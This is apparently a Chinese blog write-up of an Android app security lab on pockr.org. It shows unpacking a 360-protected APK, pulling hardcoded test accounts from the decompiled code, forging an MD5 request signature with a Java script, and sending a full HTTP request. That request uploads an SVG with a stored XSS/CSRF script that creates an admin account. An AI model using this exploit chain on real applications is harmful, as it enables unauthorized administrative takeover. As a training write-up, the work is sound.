---
layout:     post
title:      "记一次有趣的Android靶场之旅"
subtitle:   "从脱壳到后台管理，一次有趣的靶场之旅"
date:       2018-03-25 12:00:00
author:     "T-bag"
header-img: "img/post-bg-nextgen-web-pwa.jpg"
header-mask: 0.3
catalog:    true
tags:
    - 移动安全
    - Android
    - Wirte-Up
---

## 前言

>在[pockr](https://pockr.org/)玩了一个关于APP的靶场，蛮有趣的，记录一下！附上靶场链接
>
>[不破不立的App逆向](https://pockr.org/bug-environment/detail?environment_no=env_eab6d047a5ea2305aa)



## 不破不立的App逆向-Wirte-Up

> 靶场入口：<http://39.108.218.120:8126> 
>
> 花了一个免费的劵，进来看一下，APP呢，怎么只有一个健身的妹子！！
>
> 嗯~~下面还有一段字 。不用爆破，不用扫描。

![pockr1](/img/in-post/pockr-wirteup/图片 1.png)

>先找一下apk在哪。看下页面源代码
>
>Nice,藏在源码里，，嗯~~下载下来。

![pockr1](/img/in-post/pockr-wirteup/图片 2.png)

> 下载下来了了，使用adb安装一下，成功

![pockr1](/img/in-post/pockr-wirteup/图片 3.png)

> 嗯~~~，有个登录页面 ，问题是没有账号啊。前面都说了爆破几率很小，那就不爆破了。

![pockr1](/img/in-post/pockr-wirteup/图片 4.png)

>不能爆破，那就看源码。既然不破不立，那肯定要先破啊。先用jadx反编译一波呗
>
>反编译成功，很轻松啊

![pockr1](/img/in-post/pockr-wirteup/图片 5.png)

>看下反编译之后的源码。。嗯~ 360，嗯~ 加固 ，嗯~ mmp!!

![pockr1](/img/in-post/pockr-wirteup/图片 6.png)

> 再看一下，qihoo下面多了一个Configuration.java的文件，猜测是二代壳

![pockr1](/img/in-post/pockr-wirteup/图片 7.png)

> 最近刚好看了尼古拉斯.赵四的脱壳圣战,有样学样，2333
>
> [脱壳圣战](http://www.wjdiankong.cn/android%E8%84%B1%E5%A3%B3%E5%9C%A3%E6%88%98%E4%B9%8B-%E8%84%B1%E6%8E%89360%E5%8A%A0%E5%9B%BA%E5%A3%B3%E7%A0%B4%E8%A7%A3%E7%BA%A6%E5%8F%8B%E7%A5%9E%E5%99%A8%E7%9A%84%E9%92%BB%E7%9F%B3%E5%85%85/)

> 试一下里面介绍的脱壳神器drizzleDumper
>
> 下载地址: [drizzleDumper](https://github.com/DrizzleRisk/drizzleDumper)
>
> 看一下包名

![pockr1](/img/in-post/pockr-wirteup/图片 8.png)

`com.example.laravelchen.toutiao`

> 脱壳
>
> `# ./drizzleDumper com.example.laravelchen.toutiao 2`

> Success

![pockr1](/img/in-post/pockr-wirteup/图片 9.png)

> 脱了Dex文件出来。

![pockr1](/img/in-post/pockr-wirteup/图片 10.png)

> 直接pull出来，然后jadx反编译。脱壳成功

![pockr1](/img/in-post/pockr-wirteup/图片 11.png)

>开始分析代码。先找一下登录界面的activity
>
>看到一个UserLoginRegiter 。嗯，在这里启动LoginFragment，登录界面应该就是这个了

![pockr1](/img/in-post/pockr-wirteup/图片 12.png)

> 跟进来看看，好像有东西。发现了测试账号，下面的还有几个没有密码的账号

![pockr1](/img/in-post/pockr-wirteup/图片 13.png)

> 登录一波，成功登录。

![pockr1](/img/in-post/pockr-wirteup/图片 14.png)

> 实名认证可以上传东西，burp抓一下包

![pockr1](/img/in-post/pockr-wirteup/图片 15.png)

> 测试账号无权限申请。联想到刚才还有还有一堆没有密码的账号。

```
pock0@pockr.com,
pockr1@pockr.com, 
pockr2@pockr.com,
pockr@pockr.com, 
pockr123@pockr.com
```

> 看了一下请求包。没有cookie认证，猜测应该是根据这些表单数据进行验证的。修改下name试一下
>
> 写个小字典

```
test
pock0
pockr1
pockr2
pockr
pockr123
admin
```

> 跑一波，有点不同。长度172的返回都是账号无权限，test显示的是测试账号无权限

![pockr1](/img/in-post/pockr-wirteup/图片 16.png)

> 只有pockr显示的是接口签名验证失败，该账号可能是管理账号

![pockr1](/img/in-post/pockr-wirteup/图片 17.png)

> 既然接口签名验证失败，那签名是什么，timestamp应该是个时间戳，猜测接口应该是根据signatue进行验证的

![pockr1](/img/in-post/pockr-wirteup/图片 18.png)

> MD5解密一下，未查到

![pockr1](/img/in-post/pockr-wirteup/图片 19.png)

> 回来看一下源码,全局搜索一下signature

![pockr1](/img/in-post/pockr-wirteup/图片 20.png)

>在HeadActivity里，跟踪过去
>
>上传实名认证的函数应该就是这个submitPicture

![pockr1](/img/in-post/pockr-wirteup/图片 21.png)

>看一下函数，signature是根据时间戳和用户名进行MD5加密的。
>
>通过novate.upload(“upload_img”,new Builder())函数进行这些表单数据的上传的

![pockr1](/img/in-post/pockr-wirteup/图片 22.png)

> 写一个小脚本跑一下signature，这里时间戳不用变

```java
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
public class hello {
    
    public static String getMD5(String inputStr) throws NoSuchAlgorithmException {
        String md5Str = inputStr;
        if (inputStr == null) {
            return md5Str;
        }
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(inputStr.getBytes());
        md5Str = new BigInteger(1, md.digest()).toString(16);
        if (md5Str.length() % 2 != 0) {
            return "0" + md5Str;
        }
        return md5Str;
    }

    public static void main(String[] args) {
    	System.out.println("Hello World");
    	//long time = System.currentTimeMillis();
    	String time = "1517371010792";
        String userName = "pockr";
        //System.out.println("timestamp:"+String.valueOf(time));
        String signature = String.valueOf(time) + userName + "rkcop";
        
        try {
                signature = getMD5(signature);
                //System.out.println("signature");
                System.out.println("signature:"+signature);

            } catch (Exception e) {
            
            }
    }    
}
```

> 跑出来了，signature

![pockr1](/img/in-post/pockr-wirteup/图片 23.png)

> 将请求包修改一下，上传，只能上gif jpg png svg ,

![pockr1](/img/in-post/pockr-wirteup/图片 24.png)

>把这些都试一遍，就只有svg可以上传,
>
>上传111.svg成功

![pockr1](/img/in-post/pockr-wirteup/图片 25.png)

> SVG？想到了content修改上传xss payload。试一下

![pockr1](/img/in-post/pockr-wirteup/图片 26.png)

> 盲打到了，但是应该有添加httponly,所以并没有获得到cookie

![pockr1](/img/in-post/pockr-wirteup/图片 27.png)

> 看一下页面源码，有一个添加管理员用户的页面，感觉可以利用CSRF进行管理员添加，先使用js获得那个页面源码。

![pockr1](/img/in-post/pockr-wirteup/图片 28.png)

![pockr1](/img/in-post/pockr-wirteup/图片 29.png)

> 得到添加管理员form表单的源码

![pockr1](/img/in-post/pockr-wirteup/图片 30.png)

> 获得表单了，配合使用CSRF添加管理员
>
> Csrf新增管理员

```http
POST /App_User_Api/upload_img HTTP/1.1
Content-Type: multipart/form-data; boundary=dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Length: 1143
Host: 39.108.218.120:8126
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.7.0
	
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="name"
Content-Length: 4

pockr
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="realname"
Content-Length: 3

123
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="idnumber"
Content-Length: 3

456
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="timestamp"
Content-Length: 13

1517716447950
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="signature"
Content-Length: 32

9c3c2585a60c627088adcc2638eec0b8
--dee39b8c-116a-4b58-86fa-8b29c77b14be
Content-Disposition: form-data; name="userfile"; filename="1be32a81fa39fea5.svg"
Content-Type: image/svg+xml
Content-Length: 1209

<script>
$.ajax( { 
  url:'add_admin_action',
  data:{ 
       'userName' : 'testest', 
       'userPwd' : 'testest123', 
       'realName' : 'testest', 
       'userMobile' : '13344445555'
  }, 
  type:'post', 
  cache:false, 
  dataType:'json', 
  success:function(data) { 
  }
});
</script>
--dee39b8c-116a-4b58-86fa-8b29c77b14be--
```

![pockr1](/img/in-post/pockr-wirteup/图片 31.png)

> 成功，登录！！！！

![pockr1](/img/in-post/pockr-wirteup/图片 32.png)

## 结语

蛮有意思的靶场！！学到了不少东西